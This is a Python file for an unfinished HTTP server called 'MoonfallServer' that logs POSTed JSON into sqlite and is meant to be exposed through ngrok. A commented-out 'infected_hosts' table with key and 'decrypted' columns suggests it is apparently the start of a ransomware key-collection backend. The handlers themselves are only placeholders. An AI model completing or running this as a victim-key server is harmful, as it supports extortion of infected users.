from http.server import BaseHTTPRequestHandler, HTTPServer
from pyngrok import ngrok, conf
import logging, sqlite3, json

conf.get_default().auth_token = "<NGROK_AUTH_TOKEN"  #change this here, loggin to https://dashboard.ngrok.com/ and get your key.

class DatabaseManager():
    def __init__(self, db_name="database.db"):
        self.db_name = db_name
        self.conn = None
        self.query_executor = None

        try:
            self.conn = sqlite3.connect(self.db_name)
            print("Successful connection to {}".format(self.db_name))

            self.query_executor = self.conn.cursor()
            #self.query_executor.execute("""create table if not exists infected_hosts(id integer, key text NOT NULL, date text, decrypted text);""")
        except sqlite3.Error as e:
            print(e)
            raise Exception("Connection failed!")

    def retry_connection(self, db_name="database.db"):
        try:
            self.conn = sqlite3.connect(db_name)
            print("Successful connection to {}".format(db_name))

            self.query_executor = self.conn.cursor()
        except sqlite3.Error as e:
            print(e)
            raise Exception("Connection failed!")

    def execute_query(self, query, data):
        try:
            self.query_executor.execute(query, data)
            self.conn.commit()
        except sqlite3.Error as e:
            print(e)
            raise Exception("Query failed!")


class MoonfallServer(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        # logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        self._set_response()
        self.wfile.write("GET request for {}".format(
            self.path).encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        decoder = json.JSONDecoder()
        jsondata = decoder.decode(post_data.decode('utf-8'))

        # logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n", str(self.path), str(self.headers), post_data.decode('utf-8'))
        self._set_response()
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))
        
        # falta realizar la query a la db mediante el atributo database_manager
        database_manager = DatabaseManager()
        database_manager.execute_query('''insert into tbl1(one, two) values(?,?);''', ("HOLA HOLITA", 7))


def run(server_class=HTTPServer, handler_class=MoonfallServer, address="localhost", port=8080):
    try:
        # logging.basicConfig(level=logging.INFO)

        server_address = (address, port)
        httpd = server_class(server_address, handler_class)
        print("Server started http://%s:%s" % (address, port))

        # url = ngrok.connect(port)
        # logging.info('Starting httpd on {url}...\n')

        httpd.serve_forever()
        # ngrok_tunnel = ngrok.connect()
    except KeyboardInterrupt:
        httpd.server_close()
        # logging.info('Stopping httpd...\n')
        exit()


if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
